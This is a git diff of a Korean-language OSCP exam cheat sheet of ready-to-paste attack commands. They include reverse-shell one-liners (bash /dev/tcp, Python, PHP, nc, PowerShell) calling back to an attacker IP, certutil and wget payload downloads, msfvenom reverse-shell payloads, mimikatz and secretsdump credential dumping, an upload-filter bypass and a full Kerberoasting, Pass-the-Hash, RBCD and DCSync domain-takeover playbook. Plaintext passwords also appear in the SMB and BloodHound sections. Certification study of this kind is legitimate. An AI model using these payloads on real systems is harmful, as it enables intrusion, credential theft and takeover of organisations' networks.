@@ -4,10 +4,47 @@
 nmap -sCV -p- -Pn -A --min-rate 5000 10.129.5.22 -oN nmap.log
 ```
 
-FFUF
+
+## Whatweb
+```bash
+whatweb http://192.168.120.21
+```
+## FFUF
 ```bash
 ffuf -u http://10.129.9.222 -H "Host: FUZZ.usage.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
 ```
+
+## feroxbuster
+```bash
+┌──(kali㉿kali)-[~/PG/Access]
+└─$ feroxbuster -u http://192.168.193.187:80/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x html,txt,php
+
+#백업파일만 찾을 때 
+feroxbuster -u http://192.168.120.21/ -w WORDLIST -t 50 -x bak,zip,old,tar,gz
+
+```
+
+## username-anarchy
+```bash
+#설치
+sudo apt install -y username-anarchy
+#웹에서 수집한 이름(First Last)을 모든 AD 사용자명 형식으로 생성
+username-anarchy -i names.txt > users.txt
+#이름 하나 직접 입력해서 형식 확인
+username-anarchy Matthew Harrison
+#사용 가능한 형식 목록 전체 보기
+username-anarchy -f
+#조직 규칙 알 때 특정 형식만 생성
+username-anarchy -s first.last,flast -i names.txt > users.txt
+#생성 목록에 도메인 붙여 이메일로 변환
+username-anarchy -i names.txt | sed 's/$/@nagoya-industries.com/' > emails.txt
+#도구 없을 때 bash로 주요 형식 즉석 생성
+while read f l; do a=${f,,};b=${l,,};i=${a:0:1}; printf '%s\n' "$a.$b" "$i$b" "$a$b" "$i.$b" "$b$i" "$a" "$b"; done < names.txt | sort -u > users.txt
+```
+
+
+
+
 # Tool
 
 | Tool name   | description        |                              |
@@ -18,6 +55,37 @@ ffuf -u http://10.129.9.222 -H "Host: FUZZ.usage.htb" -w /usr/share/wordlists/se
 | bloodhound  | AD 도메인 구성 파악 및 취약점 |                              |
 
 # Windows
+
+## AD세트 흐름
+
+쉘 획득 > 권한 확인 > 자격증명 검색 > 도메인 열거(bloodhound) > AD공격
+1. **Kerberoasting** — SPN 걸린 서비스 계정 해시 탈취 → 크랙. 특히 **특권 그룹 소속 서비스 계정**을 노리면 크랙 한 번에 고가치 권한을 얻습니다.
+
+```
+   impacket-GetUserSPNs domain.local/USER:PASS -dc-ip <DC> -request
+   hashcat -m 13100 hash.txt rockyou.txt
+```
+
+2. **AS-REP Roasting** — pre-auth 꺼진 계정:
+
+```
+   impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <DC>
+```
+
+3. **크랙한 자격증명을 다시 BloodHound에 넣어** 새 경로 발견 (이 반복이 핵심 workflow).
+4. **ACL/DACL 남용** — BloodHound가 GenericAll/WriteDACL 같은 경로를 보여주면 그걸 악용.
+5. **Pass-the-Hash** — 덤프한 해시로 측면이동:
+
+```
+   impacket-psexec -hashes :NThash domain.local/USER@<target>
+```
+
+6. **DCSync → DC 장악** — 복제권한을 얻으면:
+
+```
+   impacket-secretsdump -just-dc domain.local/USER@<DC>
+```
+
 ## powershell 바이패스
 ```dos
 powershell -ep bypass
@@ -53,8 +121,63 @@ download system
 #impacket-secretsdump -sam sam -system system LOCAL
 ```
 
+### Rubeus
+
+
+Rubeus는 **Kerberos를 직접 공격·조작하는 Windows용 도구**입니다 (C#, GhostPack 제작). 지금 당신처럼 **도메인 가입 Windows 머신에 셸을 잡은 상태에서**, 그 머신 위에서 AD 공격을 돌릴 때 쓰는 핵심 도구예요. impacket이 칼리에서 원격으로 하는 일을, Rubeus는 타깃 호스트 안에서 합니다.
+
+당신 약점인 **6대 AD 기법 중 4개가 Rubeus로 커버됩니다:**
+
+**1) Kerberoasting** — SPN 걸린 서비스 계정 해시 탈취
+
+```
+Rubeus.exe kerberoast /outfile:hashes.txt
+```
+
+→ 나온 해시를 칼리로 옮겨 `hashcat -m 13100`으로 크랙.
+
+**2) AS-REP Roasting** — pre-auth 꺼진 계정 해시 탈취
+
+```
+Rubeus.exe asreproast /outfile:asrep.txt
+```
+
+→ `hashcat -m 18200`으로 크랙.
+
+**3) Overpass-the-Hash (pass-the-key)** — NTLM 해시로 TGT 발급받기
+
+```
+Rubeus.exe asktgt /user:USER /rc4:<NThash> /ptt
+```
+
+**4) Pass-the-Ticket** — 훔친/발급받은 티켓을 현재 세션에 주입
+
+```
+Rubeus.exe ptt /ticket:<base64_or_kirbi>
+```
+
+**그 외 자주 쓰는 것:**
+
+```
+Rubeus.exe triage      # 현재 머신의 캐시된 Kerberos 티켓 목록
+Rubeus.exe dump        # 티켓 실제로 덤프 (SYSTEM이면 전체)
+Rubeus.exe monitor     # unconstrained delegation 환경에서 들어오는 TGT 수집
+Rubeus.exe s4u ...     # constrained delegation 남용
+```
+
+
+```powershell
+#
+.\\Rubeus.exe kerberoast /outfile:kerberoast.hashes
+```
 
 # Linux
+
+## find
+```bash
+# 시스템 전체에서 SUID권한이 설정된 파일 찾기
+find / -perm -u=s 2>/dev/null
+```
 
 ### SSH
 ```bash
@@ -98,6 +221,11 @@ session
 interface_create --name ligolo17
 route_add --name ligolo --route 172.168.189.0/24
 start --tun ligolo
+
+
+# 에이전트 로컬호스트로 가는 라우트 추가 
+sudo ip route add 240.0.0.1/32 dev ligolo
+
 ```
 
 ## SCP
@@ -113,43 +241,70 @@ scp -o "GSSAPIAuthentication yes" f.frizzle@frizz.htb:'C:/\$RECYCLE.BIN/S-1-5-21
 ## SMB
 ### smbclient
 ```bash
-#SMB폴더 확인
-smbclient -L 10.129.45.168 -N
+# IP 사용
+smbclient -L 10.129.45.168 -N              # -N = 익명(비번 없이)
+smbclient -L //10.129.45.168 -N
 
-#계정으로 로그인
-smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //app.htb/Users
-#smbclient prompt에서
-#모든 하위 디렉토리까지 탐색 
+# 도메인/호스트명 사용
+smbclient -L //app.htb -N
+smbclient -L app.htb -U 'SVC_TGS%GPPstillStandingStrong2k18'   # 인증 후 목록
+
+# IP 사용
+smbclient //10.129.45.168/Users -U 'SVC_TGS%GPPstillStandingStrong2k18'
+smbclient \\\\10.129.45.168\\Users -U SVC_TGS   # 비번은 프롬프트로 입력
+
+# 도메인/호스트명 사용
+smbclient //app.htb/Users -U 'SVC_TGS%GPPstillStandingStrong2k18'
+smbclient //app.htb/Users -U 'HTB\SVC_TGS'      # DOMAIN\user 형식
+
+-N                              # 익명 (비번 없음)
+-U user                         # 사용자명만 → 비번 프롬프트
+-U 'user%password'              # 사용자명+비번 한 번에 (특수문자 때문에 따옴표)
+-U 'DOMAIN\user%password'       # 도메인 명시
+-W DOMAIN                       # 도메인 별도 지정 (-U user -W HTB)
+--pw-nt-hash -U 'user%<NThash>' # Pass-the-Hash (비번 대신 NT 해시)
+
+
+#프롬프트 내부 명령어
+recurse on        # 모든 하위 디렉토리까지 탐색
+prompt off        # 대화형 확인 끄기 (mget/mput 시 y/n 안 물음)
+ls                # 현재 경로 목록
+cd <dir>          # 디렉토리 이동
+get user.txt      # 파일 하나 다운로드
+mget *            # 현재 경로의 모든 파일 다운로드 (recurse+prompt off와 조합)
+put shell.php     # 파일 업로드
+!ls               # 로컬(칼리) 명령 실행 (앞에 ! )
+lcd /tmp          # 로컬 다운로드 경로 변경
+exit / quit       # 종료
+
+
+#전체 덤프
 recurse on
-#대화형 모드 비활성화
 prompt off
-#다중 다운로드, 현재 경로 및 모든 파일 다운로드
 mget *
-#파일 다운로드
-get user.txt
 ```
 
 ## BloodHound
 ```bash
 ### **BloodHound를 사용한 데이터 분석**
 #config 파일 위치 /home/kali/.config/bloodhound/bloodhound.config.json
-
-
-- Kali Linux에서 Neo4j 서비스 시작
-
-`sudo neo4j start`
-
-- 웹 인터페이스 접근
-
-`http://localhost:7474# ID/PW - neo4j/neo4j -> neo4j/1q2w3e4r!`
+#- Kali Linux에서 Neo4j 서비스 시작
+#`sudo neo4j start`
+#- 웹 인터페이스 접근
+#`http://localhost:7474# ID/PW - neo4j/neo4j -> neo4j/1q2w3e4r!` 
+#################위 내용은 아님########################
 
 - BloodHound 실행
-
 `bloodhound`
 
 - 종료
-
 `pkill -f bloodhoundsudo neo4j stop`
+
+SSH 로컬 포워딩
+ssh -N -L 48080:127.0.0.1:48080 kali@192.168.164.130
+
+admin / c4zeUasVPZWavSFkyYFaUTFCq449Cert
+
 ```
 
 
@@ -272,6 +427,7 @@ hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable
 ```
 
+
 ## Commonly Used Modes (-m)
 
 | **ID** | **알고리즘 (Algorithm)**                                            |
@@ -336,3 +492,1156 @@ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-dis
 
 
 
+# HexStrike AI 도구 치트시트 (OSCP 실전 — 확장판)
+
+[HexStrike AI](https://github.com/0x4m4/hexstrike-ai)가 통합한 150+ 도구 중 **OSCP에서 실제 쓰는 도구**를 골라 명령어 중심으로 정리. 복붙 후 `TARGET`/`tun0IP`/`USER`/`PASS`만 바꿔 사용.
+
+> 변수: `TARGET`=대상 IP, `tun0IP`=칼리 VPN IP(`ip a show tun0`), `DC`=도메인 컨트롤러 IP
+
+---
+
+## ⚠️ 0. OSCP 시험 도구 제한 (먼저 숙지)
+
+**완전 금지 (자동 익스플로잇):**
+
+- `sqlmap`, `commix`, `NoSQLMap`, `Tplmap`, SQLNinja — 자동 탐지+익스플로잇
+- **대량 취약점 스캐너 (공식 명시)**: Nessus, OpenVAS, NeXpose, Canvas, Core Impact
+- "열거 없이 자동으로 RCE/권한상승"을 해주는 모든 도구
+
+**⚠️ 회색지대 (공식 명시 X, 피하는 게 안전):** Nuclei — 템플릿 기반 대량 스캐너라 "유사 기능" 조항 위험.
+
+**제한 (딱 1대만):** Metasploit 모듈(exploit/auxiliary/post) + Meterpreter 페이로드. 한 번 쓰면 그 머신에 잠김.
+
+**허용 (공식 확인):** nmap(+NSE), rustscan, autorecon, ffuf, feroxbuster, gobuster, nikto, whatweb, wpscan, hydra, medusa, john, hashcat, netexec, evil-winrm, enum4linux-ng, smbmap, **msfvenom(전 머신 OK)**.
+
+> 판단 기준: 열거를 **도와주면 허용**, 알아서 **뚫어주면 금지**. 출처: [OffSec OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
+
+---
+
+## 🔍 1. 포트 스캐닝
+
+```bash
+# 빠른 전체 포트 → 열린 포트만 추출
+nmap -p- --min-rate 5000 -T4 TARGET -oN allports.txt
+# 발견된 포트 정밀 스캔 (예: 22,80,445)
+nmap -p 22,80,445 -sC -sV -oN detail.txt TARGET
+# UDP 상위 포트 (SNMP 161, DNS 53 등 놓치지 말 것)
+sudo nmap -sU --top-ports 100 TARGET -oN udp.txt
+# rustscan (초고속 → nmap 연계)
+rustscan -a TARGET --range 1-65535 -- -sC -sV
+# 취약 서비스 스크립트
+nmap -p 445 --script smb-vuln* TARGET
+```
+
+---
+
+## 📖 2. 서비스별 열거 (포트 → 무엇을 캘까)
+
+**SMB (139/445)**
+
+```bash
+enum4linux-ng -A TARGET
+smbmap -H TARGET                              # 익명 공유+권한
+smbmap -H TARGET -u USER -p PASS -r           # 인증+재귀
+smbclient -L //TARGET -N                      # 공유 목록
+smbclient //TARGET/share -N                   # 접속
+nxc smb TARGET -u '' -p '' --shares           # null 세션 공유
+nxc smb TARGET -u USER -p PASS --users --groups --pass-pol
+rpcclient -U "" -N TARGET   # → enumdomusers / querydispinfo
+```
+
+**FTP (21)**
+
+```bash
+ftp TARGET            # anonymous / anonymous 시도
+nmap --script ftp-anon -p21 TARGET
+# 익명 되면: ls, get file, put shell (업로드 가능시 웹루트 노려보기)
+```
+
+**SSH (22)** — 보통 크리덴셜 확보 후. 버전 취약점 확인, 키 재사용.
+
+**HTTP/HTTPS (80/443)** — 3번 섹션 참조.
+
+**SNMP (161/UDP)** — 커뮤니티 스트링으로 정보 대량 유출
+
+```bash
+snmpwalk -v2c -c public TARGET
+snmpwalk -v2c -c public TARGET 1.3.6.1.4.1.77.1.2.25   # 사용자 목록
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET
+```
+
+**LDAP (389)**
+
+```bash
+ldapsearch -x -H ldap://TARGET -s base namingcontexts
+ldapsearch -x -H ldap://TARGET -b "dc=domain,dc=local"
+nxc ldap TARGET -u USER -p PASS --asreproast asrep.txt
+```
+
+**SMTP (25)** — 사용자 열거
+
+```bash
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/names.txt -t TARGET
+```
+
+**DNS (53)** — 존 트랜스퍼
+
+```bash
+dig axfr @TARGET domain.local
+dnsenum domain.local
+```
+
+**MSSQL (1433) / MySQL (3306)**
+
+```bash
+impacket-mssqlclient USER:PASS@TARGET -windows-auth   # → enable_xp_cmdshell
+mysql -h TARGET -u root -p
+```
+
+**RDP (3389)**
+
+```bash
+xfreerdp /u:USER /p:PASS /v:TARGET /dynamic-resolution +clipboard
+nxc rdp TARGET -u USER -p PASS                          # 접근 확인
+# 윈도우에서
+ssh -L 13389:192.168.120.21:3389 kali@192.168.164.130
+```
+
+**NFS (2049)**
+
+```bash
+showmount -e TARGET
+mount -t nfs TARGET:/share /mnt/nfs
+```
+
+---
+
+## 🌐 3. 웹 애플리케이션
+
+**디렉토리/파일 열거**
+
+```bash
+feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -o ferox.txt
+ffuf -u http://TARGET/FUZZ -w WORDLIST -e .php,.txt -mc 200,301,302
+gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt
+```
+
+**vhost / 서브도메인**
+
+```bash
+ffuf -u http://TARGET -H "Host: FUZZ.domain.local" -w subs.txt -fs <기본크기>
+gobuster vhost -u http://TARGET -w subs.txt --append-domain
+```
+
+**파라미터 발견**
+
+```bash
+ffuf -u 'http://TARGET/page.php?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fc 404
+```
+
+**기술 스택 / 스캔**
+
+```bash
+whatweb http://TARGET
+nikto -h http://TARGET
+wpscan --url http://TARGET --enumerate u,vp,vt      # WordPress
+```
+
+**수동 취약점 테스트 (자동도구 금지 → 직접)**
+
+```bash
+# LFI 시도
+curl "http://TARGET/page.php?file=../../../../etc/passwd"
+curl "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=index.php"
+# 명령주입 시도 (Burp Repeater에서)
+;id | ;whoami | `id` | $(id) | | id
+# 파일 업로드 우회: .php 막히면 → .phtml .php5 .phar, magic byte, .htaccess 트릭
+# SSTI 탐지: {{7*7}} → 49 나오면 취약
+```
+
+**파일 업로드 .htaccess 우회 (Apache+mod_php)**
+
+```apache
+# .htaccess 내용
+AddType application/x-httpd-php .shell
+AddHandler application/x-httpd-php .shell
+# → evil.shell (PHP 웹셸) 업로드 후 접근
+```
+
+---
+
+## 🐚 4. 리버스 셸 & 파일 전송
+
+**리스너 (칼리)**
+
+```bash
+rlwrap nc -lnvp 443          # 1024 미만 포트는 sudo 필요
+```
+
+**리버스 셸 원라이너**
+
+```bash
+# Bash (Linux)
+bash -c 'bash -i >& /dev/tcp/tun0IP/443 0>&1'
+# Python
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("tun0IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+# PHP
+php -r '$s=fsockopen("tun0IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+# Netcat (mkfifo, -e 없을 때)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc tun0IP 443 >/tmp/f
+# PowerShell (Windows) — revshells.com에서 Base64 형태 권장
+powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('tun0IP',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sr=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sr,0,$sr.Length);$s.Flush()}"
+# Windows nc.exe
+nc.exe tun0IP 443 -e cmd.exe
+```
+
+> 참고 리소스: [revshells.com](https://www.revshells.com/) — OS/셸별 자동 생성
+
+**셸 안정화 (Linux)**
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+# Enter, 그다음:
+export TERM=xterm
+```
+
+**파일 전송 (칼리 → 타깃)**
+
+```bash
+# 칼리에서 호스팅
+python3 -m http.server 80
+impacket-smbserver share . -smb2support          # SMB 서버 (Windows에 편함)
+# Linux 타깃에서 받기
+wget http://tun0IP/file -O /tmp/file
+curl http://tun0IP/file -o /tmp/file
+# Windows 타깃에서 받기
+certutil -urlcache -f http://tun0IP/nc.exe C:\Windows\Temp\nc.exe
+powershell iwr http://tun0IP/file -o C:\Windows\Temp\file
+copy \\tun0IP\share\file.exe .                    # smbserver 이용
+```
+
+---
+
+## ⬆️ 5. 로컬 권한상승
+
+**Linux — 자동 + 수동**
+
+```bash
+# 자동
+./linpeas.sh | tee linpeas.txt
+# 수동 핵심 체크
+sudo -l                                   # sudo 권한 (GTFOBins 대조)
+find / -perm -4000 -type f 2>/dev/null    # SUID 바이너리
+getcap -r / 2>/dev/null                   # capabilities
+cat /etc/crontab; ls -la /etc/cron.*      # 크론잡
+uname -a                                  # 커널 익스플로잇 후보
+find / -writable -type d 2>/dev/null      # 쓰기 가능 경로
+```
+
+> `sudo -l`/SUID 결과는 항상 [GTFOBins](https://gtfobins.github.io/)에 대조.
+
+**Windows — 자동 + 수동**
+
+```powershell
+# 자동
+.\winPEASx64.exe
+# 수동 핵심
+whoami /priv          # ★ SeImpersonate→Potato, SeManageVolume→DLL하이재킹, SeBackup 등
+whoami /groups
+systeminfo            # OS 버전 → 커널 익스플로잇 후보
+sc query              # 서비스 (unquoted path, 약한 권한)
+cmdkey /list          # 저장된 자격증명
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # autologon
+```
+
+> `whoami /priv`의 juicy 권한은 [Priv2Admin](https://github.com/gtworek/Priv2Admin) / HackTricks Abusing Tokens에 대조.
+
+**Potato 계열 (SeImpersonatePrivilege 보유 시 → SYSTEM)**
+
+```
+.\PrintSpoofer64.exe -i -c cmd
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+```
+
+**SeManageVolumePrivilege → SYSTEM**: `SeManageVolumeExploit.exe` 실행 → C:\ 쓰기권한 → 악성 DLL(`PrintConfig.dll`/`tzres.dll`) 하이재킹.
+
+---
+
+## 🎯 6. Active Directory 공격 (핵심 40점)
+
+**열거 & BloodHound**
+
+```bash
+# 원격 수집
+bloodhound-python -u USER -p PASS -d domain.local -ns DC -c All
+# on-host 수집
+.\SharpHound.exe -c All
+# 수동
+nxc smb DC -u USER -p PASS --users
+setspn -T domain.local -Q */*                    # SPN(kerberoast 후보)
+```
+
+**Kerberoasting (SPN 계정 → 해시 → 크랙)**
+
+```bash
+impacket-GetUserSPNs domain.local/USER:PASS -dc-ip DC -request     # 원격(칼리)
+Rubeus.exe kerberoast /outfile:hashes.txt                          # on-host
+hashcat -m 13100 hashes.txt rockyou.txt
+```
+
+**AS-REP Roasting (pre-auth 꺼진 계정)**
+
+```bash
+impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip DC -request
+Rubeus.exe asreproast /outfile:asrep.txt
+hashcat -m 18200 asrep.txt rockyou.txt
+```
+
+**자격증명 덤프 (관리자/SYSTEM 이후)**
+
+```
+# mimikatz (관리자 필요!)
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::sam
+lsadump::dcsync /user:domain\krbtgt
+```
+
+```bash
+# impacket secretsdump (원격, 해시로도 가능)
+impacket-secretsdump domain.local/USER:PASS@TARGET
+impacket-secretsdump -just-dc domain.local/USER@DC   # DCSync
+```
+
+**Pass-the-Hash / Pass-the-Ticket / OverPtH**
+
+```bash
+impacket-psexec domain.local/USER@TARGET -hashes :<NThash>
+impacket-wmiexec domain.local/USER@TARGET -hashes :<NThash>
+evil-winrm -i TARGET -u USER -H <NThash>
+nxc smb TARGET -u USER -H <NThash> -x "whoami"
+Rubeus.exe asktgt /user:USER /rc4:<NThash> /ptt     # OverPass-the-Hash
+Rubeus.exe ptt /ticket:<base64>                     # Pass-the-Ticket
+```
+
+**측면이동 확인 (스프레이)**
+
+```bash
+nxc smb 192.168.1.0/24 -u USER -H <NThash> --continue-on-success   # 어디에 admin인지
+```
+
+---
+
+## 🔀 7. 피벗팅 & 터널링 (내부망 접근)
+
+**ligolo-ng (권장 — SOCKS 불필요, tun 인터페이스)**
+
+```bash
+# 칼리 (프록시)
+sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601
+# 타깃 (에이전트)
+.\agent.exe -connect 192.168.45.175:11601 -ignore-cert
+# 칼리 ligolo 콘솔: session 선택 후 start
+# 칼리에서 내부망 라우팅 추가
+sudo ip route add 10.10.10.0/24 dev ligolo
+# → 이제 칼리에서 10.10.10.x 로 직접 nmap/impacket 가능
+```
+
+**chisel (SOCKS 프록시)**
+
+```bash
+# 칼리 (서버)
+chisel server -p 8000 --reverse
+# 타깃 (클라이언트)
+./chisel client tun0IP:8000 R:socks
+# → proxychains로 사용 (proxychains 설정: socks5 127.0.0.1 1080)
+proxychains nmap -sT 10.10.10.5
+```
+
+**SSH 터널링**
+
+```bash
+ssh -D 1080 USER@PIVOT           # 동적 SOCKS
+ssh -L 8080:INTERNAL:80 USER@PIVOT   # 로컬 포워딩
+ssh -R 8080:127.0.0.1:80 USER@KALI   # 리버스 포워딩
+```
+
+---
+
+## 🔎 8. 익스플로잇 검색 & 크래킹 참조
+
+**searchsploit**
+
+```bash
+searchsploit apache 2.4
+searchsploit -m 48421            # 익스플로잇 로컬 복사
+searchsploit -x 48421           # 내용 보기
+```
+
+**hashcat 모드 참조**
+
+|대상|모드|대상|모드|
+|---|---|---|---|
+|NTLM|1000|Kerberoast(TGS)|13100|
+|NetNTLMv2|5600|AS-REP|18200|
+|/etc/shadow sha512|1800|MD5|0|
+|bcrypt|3200|NTLMv1|5500|
+
+**John + 추출 헬퍼**
+
+```bash
+john --wordlist=rockyou.txt hash.txt
+ssh2john id_rsa > h; zip2john f.zip > h; keepass2john db.kdbx > h
+unshadow /etc/passwd /etc/shadow > unshadowed.txt   # 리눅스 해시
+```
+
+**MSFvenom 페이로드 (전 머신 허용, Meterpreter는 1대 제한)**
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0IP LPORT=443 -f exe -o rev.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0IP LPORT=443 -f elf -o rev.elf
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0IP LPORT=443 -f dll -o evil.dll
+msfvenom -p php/reverse_php LHOST=tun0IP LPORT=443 -f raw -o shell.php
+```
+
+---
+
+## 🧭 OSCP 표준 워크플로우
+
+1. **스캔**: `nmap -p-` → 열린 포트 정밀 `nmap -sC -sV`
+2. **서비스별 열거** (2번 섹션): 낯선 포트는 배너 뽑아 검색, 웹은 feroxbuster/nikto, SMB는 enum4linux-ng
+3. **foothold**: 취약 버전 → `searchsploit` → 수동 익스플로잇 / 웹셸 업로드 → 리버스셸
+4. **셸 안정화** (4번 섹션)
+5. **로컬 privesc** (5번): linpeas/winpeas + `sudo -l`/`whoami /priv`
+6. **AD 이동** (6번): BloodHound → Kerberoast/AS-REP → PtH → DCSync → DC 장악
+7. **내부망 피벗** (7번): ligolo/chisel로 세그먼트 넘기
+8. **크래킹**: `hashid` 판별 → `hashcat`(GPU) / `john`
+9. **문서화**: 매 단계 스크린샷 + 명령어 기록 (보고서용)
+
+---
+
+## 📚 부록: HexStrike AI 전체 카테고리 (150+)
+
+- **네트워크 정찰 25+**: Nmap, Rustscan, Masscan, AutoRecon, Amass, Subfinder, Fierce, DNSEnum, TheHarvester, ARP-Scan, NBTScan, RPCClient, enum4linux(-ng), SMBMap, Responder, NetExec
+- **웹 앱 40+**: Gobuster, Dirsearch, Feroxbuster, FFuf, Dirb, HTTPx, Katana, Hakrawler, Gau, Waybackurls, Nuclei, Nikto, SQLMap, WPScan, Arjun, ParamSpider, Dalfox, Wafw00f, TestSSL, Whatweb, JWT-Tool, Wfuzz, Commix, NoSQLMap, Tplmap
+- **인증/패스워드 12+**: Hydra, John, Hashcat, Medusa, Patator, NetExec, SMBMap, Evil-WinRM, Hash-Identifier, HashID, Ophcrack
+- **바이너리/리버싱 25+**: GDB(+PEDA/GEF), Radare2, Ghidra, IDA Free, Binwalk, ROPgadget, Ropper, One-Gadget, Checksec, Pwntools, Angr, MSFVenom, Volatility
+- **클라우드/컨테이너 20+**: Prowler, ScoutSuite, Pacu, Trivy, Kube-Hunter, Kube-Bench, Checkov, AWS/Azure/GCloud CLI _(OSCP 무관)_
+- **CTF/포렌식 20+**: Volatility(3), Foremost, PhotoRec, TestDisk, Steghide, Zsteg, ExifTool, Scalpel, Autopsy, CyberChef, RSATool
+- **버그바운티/OSINT 20+**: Amass, Subfinder, Aquatone, Subjack, Sherlock, Recon-ng, Maltego, SpiderFoot, Shodan, Censys, TruffleHog
+
+> HexStrike는 AI가 이 도구들을 자동 오케스트레이션하는 MCP 서버. **시험에선 프레임워크 자동화가 아니라 위 개별 허용 도구를 수동으로** 사용해야 규정 준수.
+
+
+# AD DACL 남용 & RBCD 플레이북 (재사용용)
+
+BloodHound에서 내가 장악한 계정이 다른 객체에 **GenericAll / GenericWrite / WriteDACL / WriteOwner / Owns** 를 가질 때, 대상 유형별로 무엇을 하는지 + RBCD 전체 절차 + 트러블슈팅.
+
+> 변수: `DOMAIN`=resourced.local, `DC`=DC IP, `DCHOST`=dc의 FQDN(예: resourcedc.resourced.local), `ME`=내 계정, `MEHASH`=내 NT해시
+
+---
+
+## 0. 먼저 — "엣지 → 기법" 결정 트리
+
+BloodHound 경로에서 제어권 엣지를 보면, **대상 객체 유형**으로 기법이 갈립니다.
+
+|대상 유형|할 수 있는 것|대표 기법|
+|---|---|---|
+|**User**|비번 강제변경 / roasting|ForceChangePassword, Targeted Kerberoast, Shadow Cred|
+|**Group**|그룹에 나를 추가|특권 그룹(DA 등)이면 즉시 승격|
+|**Computer**|위임 설정 → 사칭|**RBCD** (또는 Shadow Cred)|
+|**GPO**|연결 컴퓨터에 SYSTEM 실행|pyGPOAbuse / SharpGPOAbuse|
+|**Domain**|DCSync 권한 부여|secretsdump -just-dc|
+
+핵심: **User면 비번리셋, Computer면 RBCD, Domain이면 DCSync.**
+
+---
+
+## 1. GenericAll on **User** → 비번 변경 / Roasting
+
+**비밀번호 강제 변경 (가장 단순)**
+
+```bash
+net rpc password "TARGETUSER" "NewPass123!" -U "DOMAIN/ME%PASS" -S DC
+bloodyAD --host DC -d DOMAIN -u ME -p PASS set password TARGETUSER 'NewPass123!'
+```
+
+**Targeted Kerberoasting** (SPN 심기 → roast → 제거)
+
+```bash
+python3 targetedKerberoast.py -v -d DOMAIN -u ME -p PASS --request-user TARGETUSER
+# 나온 해시: hashcat -m 13100
+```
+
+**Shadow Credentials** (ADCS/PKINIT 있을 때)
+
+```bash
+pywhisker -d DOMAIN -u ME -p PASS --target TARGETUSER --action add
+# 나온 pfx로: gettgtpkinit → 대상 TGT/NT 해시
+```
+
+---
+
+## 2. GenericAll on **Group** → 멤버 추가
+
+```bash
+net rpc group addmem "GROUPNAME" "ME" -U "DOMAIN/ME%PASS" -S DC
+bloodyAD --host DC -d DOMAIN -u ME -p PASS add groupMember "Domain Admins" ME
+```
+
+그룹이 Domain Admins / Enterprise Admins면 즉시 도메인 승격.
+
+---
+
+## 3. GenericAll on **Computer** → RBCD (★ 핵심)
+
+### 개념 한 줄
+
+GenericAll로 대상 컴퓨터의 `msDS-AllowedToActOnBehalfOfOtherIdentity`(신뢰 위임 목록)를 수정 → 내가 만든 머신 계정을 그 목록에 넣음 → 그 머신 계정으로 **아무 사용자(Administrator)를 사칭**해 대상 컴퓨터 접근.
+
+### 사전 준비 (Kerberos 필수 세팅 — 여기서 대부분 실패)
+
+```bash
+# (a) DC를 호스트명으로 등록 (Kerberos는 IP 못 씀)
+sudo sed -i '/DOMAIN/d' /etc/hosts
+echo "DC  DCHOST DOMAIN" | sudo tee -a /etc/hosts
+# (b) DC와 시간 동기화 (KRB_AP_ERR_SKEW 방지)
+sudo ntpdate DC        # 또는: sudo rdate -n DC
+# (c) MachineAccountQuota 확인 (0이면 머신 생성 불가 → Shadow Cred로 우회)
+nxc ldap DC -u ME -H MEHASH -M maq
+```
+
+### 4단계 공격
+
+```bash
+# 1) 내가 제어할 머신 계정 생성 (SPN 자동 보유 + 내가 비번 앎)
+impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Evil123!' \
+  -dc-ip DC 'DOMAIN/ME' -hashes :MEHASH
+
+# 2) GenericAll로 대상 컴퓨터가 EVIL$를 신뢰하게 설정
+impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGETPC$' -action write \
+  -dc-ip DC 'DOMAIN/ME' -hashes :MEHASH
+
+# 3) EVIL$가 Administrator 사칭 서비스 티켓 발급 (S4U)
+impacket-getST -spn 'cifs/DCHOST' -impersonate Administrator \
+  -dc-ip DC 'DOMAIN/EVIL$:Evil123!'
+
+# 4) 티켓으로 접속
+export KRB5CCNAME='Administrator@cifs_DCHOST@DOMAIN.ccache'
+impacket-psexec -k -no-pass DCHOST
+# 대안: wmiexec(135), 또는 셸 없이 해시 덤프
+impacket-secretsdump -k -no-pass DCHOST
+```
